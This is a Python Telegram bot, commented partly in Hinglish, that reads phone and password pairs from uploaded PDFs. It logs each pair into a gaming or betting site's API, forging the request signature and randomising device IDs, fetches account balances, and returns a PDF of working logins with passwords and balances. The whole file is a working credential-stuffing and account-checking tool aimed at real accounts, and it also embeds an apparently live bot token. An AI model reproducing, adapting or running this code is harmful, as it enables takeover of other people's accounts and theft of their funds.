import requests, json, time, re, io, threading, base64
import hashlib
import uuid
from pypdf import PdfReader
from reportlab.lib.pagesizes import A4
from reportlab.pdfgen import canvas

# ══════════════════════════════════════════════════════
# TELEGRAM BOT
# ══════════════════════════════════════════════════════
BOT_TOKEN = "8891359493:AAEWUdJ3OBJaMjSElGk0qIoYdmkkRTLZnBs" # ⚠️ Ise turant revoke karke naya token lagana
TG        = f"https://api.telegram.org/bot{BOT_TOKEN}"
TG_FILE   = f"https://api.telegram.org/file/bot{BOT_TOKEN}"

# ══════════════════════════════════════════════════════
# BDG GAME URLs
# ══════════════════════════════════════════════════════
LOGIN_PAGE = "https://bdg6848.com/"
LOGIN_API  = "https://api.9wbdg.com/api/webapi/Login"
GET_USERINFO_API = "https://api.9wbdg.com/api/webapi/GetUserInfo"
ORIGIN     = "https://bdg6848.com"

headers = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "Origin": ORIGIN,
    "Referer": ORIGIN + "/",
}

STOP_FLAG = {"stop": False, "chat_id": None}

# ══════════════════════════════════════════════════════
# SIGNATURE GENERATOR FUNCTION
# ══════════════════════════════════════════════════════
def generate_signature(payload):
    temp_payload = {k: v for k, v in payload.items() if k not in ("signature", "timestamp")}
    skip_keys = {"signature", "track", "xosoBettingData"}
    final_data = {}
    
    for k in sorted(temp_payload.keys()):
        if k not in skip_keys and temp_payload[k] is not None and temp_payload[k] != "":
            final_data[k] = temp_payload[k]
            
    json_string = json.dumps(final_data, separators=(",", ":"), ensure_ascii=False)
    return hashlib.md5(json_string.encode()).hexdigest().upper()


# ══════════════════════════════════════════════════════
# PDF -> LIST of (phone, pass)
# ══════════════════════════════════════════════════════
def extract_pairs_from_pdf(pdf_bytes):
    reader = PdfReader(io.BytesIO(pdf_bytes))
    text = ""
    for p in reader.pages:
        text += (p.extract_text() or "") + "\n"

    print("── PDF TEXT ──\n", text, "\n──────────────")
    pairs, seen = [], set()

    for line in text.splitlines():
        line = line.strip()
        if not line: continue
        for m in re.finditer(r'(?<!\d)(\d{10})(?!\d)', line):
            phone = m.group(1)
            if phone in seen: continue
            rest = line[m.end():].strip()
            for t in rest.split():
                if re.fullmatch(r'\d+(\.\d+)?', t): continue
                seen.add(phone)
                pairs.append((phone, t))
                break

    if not pairs:
        tokens = text.split()
        i = 0
        while i < len(tokens):
            t = tokens[i]
            if re.fullmatch(r'\d{10}', t) and t not in seen:
                for j in range(i + 1, min(i + 6, len(tokens))):
                    nxt = tokens[j]
                    if not re.fullmatch(r'\d+(\.\d+)?', nxt):
                        seen.add(t)
                        pairs.append((t, nxt))
                        break
            i += 1
    return pairs


# ══════════════════════════════════════════════════════
# HELPERS
# ══════════════════════════════════════════════════════
def find_key(obj, key):
    if isinstance(obj, dict):
        for k, v in obj.items():
            if k == key: return v
            r = find_key(v, key)
            if r is not None: return r
    elif isinstance(obj, list):
        for it in obj:
            r = find_key(it, key)
            if r is not None: return r
    return None


def decode_jwt_payload(token):
    try:
        parts = token.split(".")
        if len(parts) < 2: return {}
        p = parts[1] + "=" * (-len(parts[1]) % 4)
        return json.loads(base64.urlsafe_b64decode(p))
    except Exception:
        return {}


# ══════════════════════════════════════════════════════
# BDG LOGIN (UPDATED: Random Device ID & 91 Prefix)
# ══════════════════════════════════════════════════════
def do_login(phone, password):
    phone_str = str(phone).strip()
    if len(phone_str) == 10 and phone_str.isdigit():
        phone_str = "91" + phone_str

    s = requests.Session()
    try:
        s.get(LOGIN_PAGE, headers=headers, timeout=20)
    except Exception:
        pass

    # 🔥 Random Device ID generate karo
    random_device_id = uuid.uuid4().hex

    payload = {
        "deviceId":  random_device_id, # <-- Ab random jayega
        "username":  phone_str,
        "pwd":       password,
        "phonetype": 1,
        "logintype": "mobile",
        "language":  0,
        "appId":  "",
        "pkgId":  "",
        "app":    "",
        "packId": "",
        "pxelId": "",
    }
    
    payload["random"] = uuid.uuid4().hex
    payload["signature"] = generate_signature(payload)
    payload["timestamp"] = int(time.time())

    r = s.post(LOGIN_API, json=payload, headers=headers, timeout=30)
    try:
        data = r.json()
    except Exception:
        return s, None, None, "0.00", {"raw": r.text[:200]}

    if data.get("code") != 0:
        return s, None, None, "0.00", data

    inner = data.get("data") or {}
    sk = inner.get("token") or find_key(data, "sessionKey")

    uid = None
    if sk:
        jwt_data = decode_jwt_payload(sk)
        uid = jwt_data.get("UserId") or jwt_data.get("userId")

    if not uid:
        uid = (inner.get("userId") or find_key(data, "userId")
               or find_key(data, "user_id") or find_key(data, "uid"))
    
    balance = "0.00"
    if sk:
        try:
            info_headers = headers.copy()
            info_headers["Authorization"] = f"Bearer {sk}"
            info_payload = {"signature": sk}
            
            info_r = s.post(GET_USERINFO_API, json=info_payload, headers=info_headers, timeout=30)
            info_data = info_r.json()
            
            if info_data.get("code") == 0:
                inner_info = info_data.get("data") or {}
                balance = inner_info.get("amount") or "0.00"
        except Exception as e:
            print(f"GetUserInfo Error for {phone_str}: {e}")

    return s, sk, uid, balance, data


# ══════════════════════════════════════════════════════
# REPORT PDF
# ══════════════════════════════════════════════════════
def make_report_pdf(success_list, fail_list):
    buf = io.BytesIO()
    c = canvas.Canvas(buf, pagesize=A4)
    w, h = A4

    y = h - 60
    c.setFont("Helvetica-Bold", 16)
    c.drawString(50, y, "Successful Logins")
    y -= 10
    c.setFont("Helvetica", 10)
    c.drawString(50, y, f"Total: {len(success_list)}")
    y -= 25

    c.setFont("Helvetica-Bold", 11)
    c.drawString(50, y, "Phone")
    c.drawString(160, y, "Password")
    c.drawString(280, y, "User ID")
    c.drawString(400, y, "Balance")
    y -= 8
    c.line(50, y, 550, y)
    y -= 16

    c.setFont("Helvetica", 11)
    for phone, pwd, uid, bal in success_list:
        if y < 60:
            c.showPage()
            y = h - 60
            c.setFont("Helvetica-Bold", 11)
            c.drawString(50, y, "Phone")
            c.drawString(160, y, "Password")
            c.drawString(280, y, "User ID")
            c.drawString(400, y, "Balance")
            y -= 8
            c.line(50, y, 550, y)
            y -= 16
            c.setFont("Helvetica", 11)
        c.drawString(50, y, str(phone))
        c.drawString(160, y, str(pwd))
        c.drawString(280, y, str(uid))
        c.drawString(400, y, f"Rs {bal}")
        y -= 20

    if fail_list:
        c.showPage()
        y = h - 60
        c.setFont("Helvetica-Bold", 16)
        c.drawString(50, y, "Failed Logins")
        y -= 10
        c.setFont("Helvetica", 10)
        c.drawString(50, y, f"Total: {len(fail_list)}")
        y -= 25

        c.setFont("Helvetica-Bold", 11)
        c.drawString(50, y, "Phone")
        c.drawString(200, y, "Password")
        c.drawString(360, y, "Reason")
        y -= 8
        c.line(50, y, 550, y)
        y -= 16

        c.setFont("Helvetica", 11)
        for phone, pwd, reason in fail_list:
            if y < 60:
                c.showPage()
                y = h - 60
                c.setFont("Helvetica-Bold", 11)
                c.drawString(50, y, "Phone")
                c.drawString(200, y, "Password")
                c.drawString(360, y, "Reason")
                y -= 8
                c.line(50, y, 550, y)
                y -= 16
                c.setFont("Helvetica", 11)
            c.drawString(50, y, str(phone))
            c.drawString(200, y, str(pwd))
            c.drawString(360, y, str(reason)[:35])
            y -= 20

    c.save()
    buf.seek(0)
    return buf.read()


# ══════════════════════════════════════════════════════
# TELEGRAM HELPERS
# ══════════════════════════════════════════════════════
def send_msg(chat_id, text):
    try:
        return requests.post(f"{TG}/sendMessage",
            json={"chat_id": chat_id, "text": text, "parse_mode": "HTML"},
            timeout=20).json()
    except Exception as e:
        print("send err:", e); return {}


def edit_msg(chat_id, msg_id, text):
    try:
        requests.post(f"{TG}/editMessageText",
            json={"chat_id": chat_id, "message_id": msg_id,
                  "text": text, "parse_mode": "HTML"}, timeout=20)
    except Exception as e:
        print("edit err:", e)


def send_doc(chat_id, filename, data, caption=""):
    requests.post(f"{TG}/sendDocument",
        data={"chat_id": chat_id, "caption": caption},
        files={"document": (filename, data, "application/pdf")},
        timeout=60)


def get_file_bytes(file_id):
    r = requests.get(f"{TG}/getFile", params={"file_id": file_id}, timeout=20).json()
    path = r["result"]["file_path"]
    return requests.get(f"{TG_FILE}/{path}", timeout=60).content


# ══════════════════════════════════════════════════════
# WORKER (UPDATED: 10 Second Delay)
# ══════════════════════════════════════════════════════
def process_pairs(chat_id, prog_id, pairs):
    total = len(pairs)
    success_list = []
    fail_list    = []
    t0 = time.time()
    stopped = False

    for i, (phone, old) in enumerate(pairs, 1):
        if STOP_FLAG["stop"] and STOP_FLAG["chat_id"] == chat_id:
            stopped = True
            break

        try:
            s, sk, uid, balance, raw = do_login(phone, old)
            if sk and uid:
                success_list.append((phone, old, uid, balance))
            else:
                reason = "login failed"
                if isinstance(raw, dict):
                    reason = str(raw.get("msg") or raw.get("message") or reason)[:40]
                fail_list.append((phone, old, reason))
        except Exception as e:
            fail_list.append((phone, old, str(e)[:40]))

        done = len(success_list)
        bad  = len(fail_list)
        eta = int((time.time() - t0) / i * (total - i))
        edit_msg(chat_id, prog_id,
            f"⚙️ Processing... {i}/{total}\n"
            f"✅ Success: {done} ❌ Fail: {bad}\n"
            f"⏱️ ETA ~{eta}s\n"
            f"<i>/stop bhejo rokne ke liye</i>")

        if i < total:
            # 🔥 10 Second Delay (1-1 second ke loop me, taaki /stop kaam kare)
            for _ in range(10):
                if STOP_FLAG["stop"] and STOP_FLAG["chat_id"] == chat_id:
                    stopped = True
                    break
                time.sleep(1)
            if stopped:
                break

    done = len(success_list)
    bad  = len(fail_list)
    pdf_out = make_report_pdf(success_list, fail_list)
    tag = "⏹️ <b>STOPPED</b>" if stopped else "🎉 <b>Ho gaya!</b>"
    send_doc(chat_id, "logins_report.pdf", pdf_out,
             caption=f"{tag}\nTotal: {total} Processed: {done + bad}\n"
                     f"✅ Success: {done} ❌ Fail: {bad}")

    edit_msg(chat_id, prog_id,
        f"{tag}\nTotal: {total}\nProcessed: {done + bad}\n"
        f"✅ Success: {done}\n❌ Fail: {bad}")

    STOP_FLAG["stop"] = False
    STOP_FLAG["chat_id"] = None


# ══════════════════════════════════════════════════════
# MAIN LOOP
# ══════════════════════════════════════════════════════
def main():
    print("🤖 BDG Login Bot started...")
    offset = None

    while True:
        try:
            p = {"timeout": 20}
            if offset is not None:
                p["offset"] = offset
            r = requests.get(f"{TG}/getUpdates", params=p, timeout=30).json()

            for upd in r.get("result", []):
                offset = upd["update_id"] + 1
                msg = upd.get("message") or upd.get("channel_post")
                if not msg: continue

                chat_id = msg["chat"]["id"]
                text = (msg.get("text") or "").strip()

                if text == "/stop":
                    if STOP_FLAG["stop"]:
                        send_msg(chat_id, "ℹ️ Already stopping...")
                    else:
                        STOP_FLAG["stop"] = True
                        STOP_FLAG["chat_id"] = chat_id
                        send_msg(chat_id, "⏹️ Stop signal bheja. Current entry ke baad rukega...")
                    continue

                doc = msg.get("document")
                if not doc or not doc.get("file_name", "").lower().endswith(".pdf"):
                    if text:
                        send_msg(chat_id, "📄 PDF bhejo (phone + password lines). "
                                          "Processing ke beech <b>/stop</b> bhej sakte ho.")
                    continue

                prog = send_msg(chat_id, "⏳ PDF mil gaya. Parse ho raha hai...")
                prog_id = prog.get("result", {}).get("message_id")

                try:
                    pdf_bytes = get_file_bytes(doc["file_id"])
                    pairs = extract_pairs_from_pdf(pdf_bytes)

                    if not pairs:
                        edit_msg(chat_id, prog_id, "❌ PDF se koi phone/pass nahi mila.")
                        continue

                    STOP_FLAG["stop"] = False
                    STOP_FLAG["chat_id"] = chat_id

                    threading.Thread(
                        target=process_pairs,
                        args=(chat_id, prog_id, pairs),
                        daemon=True
                    ).start()

                except Exception as e:
                    edit_msg(chat_id, prog_id, f"💥 Error: <code>{e}</code>")

        except Exception as e:
            print("loop err:", e)
            time.sleep(2)


if __name__ == "__main__":
    main()
